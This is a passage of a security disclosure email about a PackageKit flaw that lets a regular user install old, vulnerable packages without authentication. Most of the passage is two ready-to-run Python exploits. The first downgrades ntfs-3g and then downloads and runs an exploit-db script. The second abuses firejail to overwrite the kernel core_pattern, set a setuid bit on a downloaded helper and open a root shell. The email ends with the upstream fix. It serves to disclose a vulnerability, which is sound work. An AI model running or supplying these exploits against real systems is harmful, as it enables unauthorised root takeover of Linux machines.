# PackageKit.
#
# The old ntfs-3g version is vulnerable to CVE-2017-0358 and allows to load
# a user controlled kernel module by using the MODPROBE_OPTIONS environment
# variable.
#
# Since we can install any other packages we like via PackageKit, this PoC
# also installs 'build-essential', 'linux-headers' and 'dos2unix' for
# setting up the kernel build environment necessary to use the exploit.
#
# Even if ntfs-3g is already installed on Debian it can be downgraded to the
# to the downgrade restriction not being enforced by the PackageKit apt
# backend.
#
# Should an authentication prompt pop up (in a graphical environment) then
# simply press cancel to make the PoC continue.

from __future__ import print_function
import os, sys
import urllib.request
import subprocess
import functools
import errno

call =3D functools.partial(subprocess.call, close_fds =3D True, shell =3D F=
alse)
check_output =3D functools.partial(subprocess.check_output, close_fds =3D T=
rue, shell =3D False)
popen =3D functools.partial(subprocess.Popen, close_fds =3D True, shell =3D=
 False)

def add_space(amount):
	print('\n' * amount)

def download_url(url):

	base =3D url.split('/')[-1]
	print("Downloading", url, "to", base)
	con =3D urllib.request.urlopen(url)

	with open(base, 'wb') as fd:
		while True:
			chunk =3D con.read(4096)

			if not chunk:
				break

			fd.write(chunk)

	return os.path.join( os.getcwd(), base )

def run_pkcon(cmdline):

	pkcon =3D "/usr/bin/pkcon"
	cmdline =3D [pkcon, "-y"] + cmdline

	print("Using command line", ' '.join(cmdline))

	# use /dev/null as stdin to suppress authentication dialogs
	with open("/dev/null", 'r') as null:
		res =3D call(
			cmdline,
			stdin =3D null
		)

		if res =3D=3D 0:
			print("Successfully called pkcon")
		else:
			print("pkcon failed")
			sys.exit(1)

def install_deb(debs):

	if not isinstance(debs, list):
		debs =3D [ debs ]

	cmdline =3D [ "install-local", "--allow-reinstall" ] + debs
	print("Trying to install", ' '.join(debs))
	run_pkcon(cmdline)

# hint is a prefix for finding the right DEB package in the cache (e.g.
# multiple gcc packages with various prefixes are downloaded)
def install_package(pkg, hint =3D None):

	cmdline =3D [ "install", "--only-download", pkg ]
	print("Trying to download system package", pkg)
	run_pkcon(cmdline)

	candidates =3D []

	archives_root =3D "/var/cache/apt/archives"

	# now look up the archive and install it, dependencies are implicitly
	# pulled in by PackageKit
	for archive in os.listdir(archives_root):
		if not archive.endswith(".deb"):
			continue
		elif not archive.startswith(pkg):
			continue
		elif hint and not archive.startswith(hint):
			continue

		candidates.append(archive)

	if not candidates:
		print("Couldn't determine DEB package to install")
		sys.exit(1)
	elif len(candidates) > 1:
		print("More than one DEB install candidate found:", candidates)
		sys.exit(1)

	pkg_archive =3D os.path.join( archives_root, candidates[0] )

	cmdline =3D [ "install-local", "--allow-reinstall", pkg_archive ]
	print("Trying to install", pkg_archive)
	run_pkcon(cmdline)

pkg_url_base =3D "https://cdimage.debian.org/mirror/cdimage/snapshot/Debian=
/pool/main"

pkg_bases =3D [
        "n/nettle/libhogweed2_2.7.1-5_amd64.deb",
	"n/nettle/libnettle4_2.7.1-5_amd64.deb",
	"g/gnutls28/libgnutls-deb0-28_3.3.8-6_amd64.deb",
	"n/ntfs-3g/ntfs-3g_2014.2.15AR.2-1+deb8u2_amd64.deb",
]

debs =3D []

for pkg in pkg_bases:
	deb =3D download_url('/'.join([pkg_url_base, pkg]))

	debs.append(deb)

add_space(3)

install_deb(debs)

kernelver =3D check_output(["uname", "-r"]).decode().strip()

for pkg in ("build-essential", "linux-headers-{}".format(kernelver), "dos2u=
nix"):

	with open("/dev/null", 'w') as null:
		if call(["dpkg", "-s", pkg], stdout =3D null) =3D=3D 0:
			continue

		add_space(3)
		install_package(pkg)

add_space(3)
exploit_dir =3D os.path.expanduser("~/ntfs_exploit")
try:
	os.makedirs(exploit_dir)
except OSError as e:
	if e.errno !=3D errno.EEXIST:
		raise
os.chdir(exploit_dir)

print("Downloading exploit script")
# a program that helps getting a root shell once equipped with the setuid r=
oot bit
exploit_url =3D "https://www.exploit-db.com/download/41240.sh"
exploit_script =3D download_url(exploit_url)
call(["dos2unix", exploit_script])
os.chmod(exploit_script, 0o755)

add_space(3)
print("Running exploit script")
call(exploit_script)


--pmcieas4bqehbboh
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="pk_root_ubuntu_firejail.py"
Content-Transfer-Encoding: quoted-printable

#!/usr/bin/python3
# vim: noet ts=3D8 sts=3D8 sw=3D8

# Author: Matthias Gerstner <matthias.gerstner@suse.de>
# SUSE Linux GmbH
# Date: 2018-04-05
#
# Proof of concept: installation of an outdated package as a regular user v=
ia
# PackageKit on Ubuntu to exploit a security defect and subsequently obtain
# root privileges.
#
# This script is supposed to be run on Ubuntu 17.10 desktop as a regular us=
er.
#
# Preconditions:
#
# - PackageKit must be installed (which it is by default)
#
# This program downloads an old version of the firejail package that carries
# a valid signature and which is installed without admin permissions via
# PackageKit.
#
# The old firejail version is vulnerable to CVE-2017-5180 and allows to gain
# root privileges by writing to files normally only accessible by root. This
# is a variation of the exploit used in # http://seclists.org/oss-sec/2017/=
q1/20.
# This version of firejail prevents writing to locations in /bin, /sbin,
# /etc/, /usr, /var, /home, and /lib{32,64}. This still leaves /sys/, /proc,
# /run, /boot and / itself to play with.
#
# Since we can install any other packages we like via PackageKit, this PoC
# also installs 'gcc' for compiling some helper programs.
#
# Even if firejail is already installed on Ubuntu it can be downgraded to t=
he
# vulnerable version due to the downgrade restriction not being enforced by
# the PackageKit apt backend.
#
# Should an authentication prompt pop up (in a graphical environment) then
# simply press cancel to make the PoC continue.

from __future__ import print_function
import os, sys
import urllib.request
import subprocess
import time
import functools
import errno
import stat

# set this to False to prevent actual installation/downgrade of firejail
#
# gcc will still be installed if not present yet
armed =3D True

call =3D functools.partial(subprocess.call, close_fds =3D True, shell =3D F=
alse)
check_output =3D functools.partial(subprocess.check_output, close_fds =3D T=
rue, shell =3D False)
popen =3D functools.partial(subprocess.Popen, close_fds =3D True, shell =3D=
 False)

def add_space(amount):
	print('\n' * amount)

def print_pkg_version(pkg):

	print("Currently installed version of {}: ".format(pkg), end =3D '')
	sys.stdout.flush()
	out =3D check_output([ "/usr/bin/dpkg", "-s", pkg ])

	for line in out.decode().splitlines():
		if not line.startswith("Version:"):
			continue
		parts =3D line.split(':')
		print(parts[-1], end =3D '', sep =3D '')
		break
	print()

def download_url(url):

	base =3D url.split('/')[-1]
	print("Downloading", url, "to", base)
	con =3D urllib.request.urlopen(url)

	with open(base, 'wb') as fd:
		while True:
			chunk =3D con.read(4096)

			if not chunk:
				break

			fd.write(chunk)

	return os.path.join( os.getcwd(), base )

def run_pkcon(cmdline, force =3D False):

	pkcon =3D "/usr/bin/pkcon"
	cmdline =3D [pkcon, "-y"] + cmdline

	if not armed and not force:
		return
	print("Using command line", ' '.join(cmdline))

	# use /dev/null as stdin to suppress authentication dialogs
	with open("/dev/null", 'r') as null:
		res =3D call(
			cmdline,
			stdin =3D null
		)

		if res =3D=3D 0:
			print("Successfully called pkcon")
		else:
			print("pkcon failed")
			sys.exit(1)

def install_deb(deb, pkg_base):

	cmdline =3D [ "install-local", "--allow-reinstall", deb ]
	print("Trying to install", deb)
	run_pkcon(cmdline)

# hint is a prefix for finding the right DEB package in the cache (e.g.
# multiple gcc packages with various prefixes are downloaded)
def install_package(pkg, hint):

	cmdline =3D [ "install", "--only-download", pkg ]
	print("Trying to download system package", pkg)
	run_pkcon(cmdline, force =3D True)

	candidates =3D []

	archives_root =3D "/var/cache/apt/archives"

	# now look up the archive and install it, dependencies are implicitly
	# pulled in by PackageKit
	for archive in os.listdir(archives_root):
		if not archive.endswith(".deb"):
			continue
		elif not archive.startswith(pkg):
			continue
		elif not archive.startswith(hint):
			continue

		candidates.append(archive)

	if not candidates:
		print("Couldn't determine DEB package to install")
		sys.exit(1)
	elif len(candidates) > 1:
		print("More than one DEB install candidate found:", candidates)
		sys.exit(1)

	pkg_archive =3D os.path.join( archives_root, candidates[0] )

	cmdline =3D [ "install-local", "--allow-reinstall", pkg_archive ]
	print("Trying to install", pkg_archive)
	run_pkcon(cmdline, force =3D True)

gcc =3D "/usr/bin/gcc"

def build_prog_from_file(src):

	base =3D os.path.splitext(src)[0]
	cmdline =3D [gcc, src, "-o", base]
	print("Trying to compile", src)
	print("Using command line", ' '.join(cmdline))

	res =3D call(cmdline)

	if res =3D=3D 0:
		print("Successfully built", src, "in", base)
	else:
		print("Failed to build", src)
		sys.exit(1)

	return os.path.join( os.getcwd(), base )

def build_prog_from_stdin(code, out):

	cmdline =3D [gcc, "-x", "c", "-o", out, "-"]
	print("Trying to compile", code)

	proc =3D popen(cmdline, stdin =3D subprocess.PIPE)

	proc.stdin.write(code.encode())
	proc.stdin.close()

	res =3D proc.wait()

	if res =3D=3D 0:
		print("Successfully built", code, "in", out)
	else:
		print("Failed to build", code)
		sys.exit(1)

	return os.path.join( os.getcwd(), out )

aged_firejail_url =3D "http://debian.charite.de/ubuntu/pool/universe/f/fire=
jail/firejail_0.9.38-1_amd64.deb"

aged_firejail =3D download_url(aged_firejail_url)

add_space(3)

install_deb(aged_firejail, "firejail")
if armed:
	print_pkg_version("firejail")
add_space(3)

if not os.path.exists(gcc):
	# we need a compiler to build some source on the fly
	install_package("gcc", "gcc_4%3a")

add_space(3)
# a program that helps getting a root shell once equipped with the setuid r=
oot bit
suid_exec_url =3D "https://www.halfdog.net/Misc/Utils/SuidExec.c"
suid_exec_src =3D download_url(suid_exec_url)
suid_exec_bin =3D build_prog_from_file(suid_exec_src)

add_space(3)
# a program that provokes a segmentation fault for the core handler to be
# called by the kernel
segfault_bin =3D build_prog_from_stdin(
	"int main() { int *i =3D 0; *i =3D 5; }", out =3D "segfault"
)

add_space(3)
# this script will be called as core dump handler by the kernel
# we let it set the setuid bit on the suid_exec_bin
fake_core_handler_script =3D """#!/bin/bash

suid_exec=3D{suid_exec}
chown root:root "$suid_exec"
chmod 4777  "$suid_exec"
"""

fake_core_handler_path =3D os.path.join( os.getcwd(), "fake_core_handler")

print("Writing fake core handler to", fake_core_handler_path)
with open(fake_core_handler_path, 'w') as fd:
	fd.write(fake_core_handler_script.format(
		suid_exec =3D suid_exec_bin
	))
# make it executable for everybody
os.chmod(fake_core_handler_path, 0o755)

# firejail copies the .asoundrc and .Xauthority file into the private home
# directory we specify. for this exploit we go for the .asoundrc.
#
# this needs to contain the value we want to write into the core_pattern pr=
oc
# file.
print("Writing .asoundrc with core_pattern path")
with open(os.path.expanduser("~/.asoundrc"), 'w') as fd:
	fd.write("|{}".format(fake_core_handler_path))

firejail_home =3D os.path.expanduser("~/firejail")
try:
	os.makedirs(firejail_home)
except OSError as e:
	if e.errno !=3D errno.EEXIST:
		raise

proc_core_pattern =3D "/proc/sys/kernel/core_pattern"

print("Setting up .asoundrc symlink in private home")
# create a symlink to the core_pattern file where the firejail setuid binary
# will happily write our original .asoundrc content to.
try:
	os.symlink(proc_core_pattern, os.path.join(firejail_home, ".asoundrc"))
except OSError as e:
	# if it exists let's hope it's a good one ;)
	if e.errno !=3D errno.EEXIST:
		raise

# now let's put things into motion

print("Calling firejail to trigger exploit")
cmdline =3D ["/usr/bin/firejail", "--private=3D" + firejail_home, "/usr/bin=
/id"]
print("Using command line", ' '.join(cmdline))
call( cmdline )

# by now we should have the new core_pattern value

print("Calling", segfault_bin, "to trigger core dump handler")
call( segfault_bin )

# sleep a bit for the handler to be called for sure
time.sleep(5)

st =3D os.stat(suid_exec_bin)
if (st.st_mode & stat.S_ISUID) =3D=3D 0:
	print("No setuid bit present on", suid_exec_bin, "! Exploit failed")
	sys.exit(1)
# by now our fake core handler should have been called and our setuid helper
# binary should be correctly equipped with setuid root.
print("Entering root shell")
call( [suid_exec_bin, "/bin/bash"] )

--pmcieas4bqehbboh
Content-Type: text/x-patch; charset=us-ascii
Content-Disposition: attachment; filename="0001-Do-not-set-JUST_REINSTALL-on-any-kind-of-auth-failur.patch"
Content-Transfer-Encoding: quoted-printable

=46rom bb9f9a8fb451d7a2d81f7390993db75491224729 Mon Sep 17 00:00:00 2001
From: Richard Hughes <richard@hughsie.com>
Date: Mon, 9 Apr 2018 16:39:56 +0100
Subject: [PATCH] Do not set JUST_REINSTALL on any kind of auth failure

If we try to continue the auth queue when it has been cancelled (or failed)
then we fall upon the obscure JUST_REINSTALL transaction flag which only the
DNF backend actually verifies.

Many thanks to Matthias Gerstner <mgerstner@suse.de> for spotting the probl=
em.
---
 src/pk-transaction.c | 27 ++++++++-------------------
 1 file changed, 8 insertions(+), 19 deletions(-)

diff --git a/src/pk-transaction.c b/src/pk-transaction.c
index 1d006c782..ffee29f6f 100644
--- a/src/pk-transaction.c
+++ b/src/pk-transaction.c
@@ -2351,25 +2351,14 @@ pk_transaction_authorize_actions_finished_cb (GObje=
ct *source_object,
=20
 	/* did not auth */
 	if (!polkit_authorization_result_get_is_authorized (result)) {
-		if (g_strcmp0 (action_id, "org.freedesktop.packagekit.package-install") =
=3D=3D 0 &&
-			       pk_bitfield_contain (priv->cached_transaction_flags,
-						    PK_TRANSACTION_FLAG_ENUM_ALLOW_REINSTALL)) {
-			g_debug ("allowing just reinstallation");
-			pk_bitfield_add (priv->cached_transaction_flags,
-					 PK_TRANSACTION_FLAG_ENUM_JUST_REINSTALL);
-		} else {
-			priv->waiting_for_auth =3D FALSE;
-			/* emit an ::StatusChanged, ::ErrorCode() and then ::Finished() */
-			pk_transaction_status_changed_emit (data->transaction, PK_STATUS_ENUM_F=
INISHED);
-			pk_transaction_error_code_emit (data->transaction, PK_ERROR_ENUM_NOT_AU=
THORIZED,
-							"Failed to obtain authentication.");
-			pk_transaction_finished_emit (data->transaction, PK_EXIT_ENUM_FAILED, 0=
);
-
-			syslog (LOG_AUTH | LOG_NOTICE,
-				"uid %i failed to obtain auth",
-				priv->uid);
-			goto out;
-		}
+		priv->waiting_for_auth =3D FALSE;
+		/* emit an ::StatusChanged, ::ErrorCode() and then ::Finished() */
+		pk_transaction_status_changed_emit (data->transaction, PK_STATUS_ENUM_FI=
NISHED);
+		pk_transaction_error_code_emit (data->transaction, PK_ERROR_ENUM_NOT_AUT=
HORIZED,
+						"Failed to obtain authentication.");
+		pk_transaction_finished_emit (data->transaction, PK_EXIT_ENUM_FAILED, 0);
+		syslog (LOG_AUTH | LOG_NOTICE, "uid %i failed to obtain auth", priv->uid=
);
+		goto out;
 	}
=20
 	if (data->actions->len <=3D 1) {
--=20
2.17.0


--pmcieas4bqehbboh--

--ay53o7hp4dmuctmr
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: Digital signature

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIcBAEBAgAGBQJa3fExAAoJEBTEBclxkjVTCbIQALpy4UIh19lMhX60Y7NO+GTP
AKkWJC/JTlVYvgerfeoSEnBRDtLFfC5kDyq9Q3PyfQPlTytGlyuXcCU5iOKFj6v4
jfDfwADoy/ZCN4XKl8Z9H2vEbxSx0T6eAFTHKK3V2rEAXFjwNh/B25OPh/cvsavR
xMHhF8oOksmBtG9mNj3SVqNEVd+L87EyvYZy4q6Ct/0N1PecxmTCnfVKx+w0mLrj
wZ/nHuBDRd9qMVQCStZ7bIFSDbJ48ElLWHvARhZTTaKYn+TTobugq2qzbunDuBsC
96sgjuax8k7OcZMv0OFDLvBsXrNgDpBZLvPf/3s4GVsKyGUUcVl2BO0/xYwpF3Eu
VWmU2Tce5l+K88hnoe9qmdCPJ5e4WCK6SC4rUavsqVZQLZZQNEen3nPoJ5dbdOeP
rk3P6RXEKrMpSWQ5D+2k3pdbJe4y+A5VI24og6ftswzJisqzdLpzd2yULkVH/bx5
YSNqt7trDMcKtg0YJ1/n+D0kvlwH6byn7/iDHVNYrAbg0FOJVscSfk6HVhNItk5n
Js1art9TwqYs+QpEog9+MJa9wfs2xKnusJTzEkT74ishvwtvwFJKKci8lQ+c0D6V
mhmL49GBUGGIrk9tgq5Kl4O+ZNG45NtpgSJoWV74DjarLQ/i2l3wXsE2lW7i/6ZL
XiMi7xlaNH/PPF/LqUpf
=1HMs
-----END PGP SIGNATURE-----

--ay53o7hp4dmuctmr--
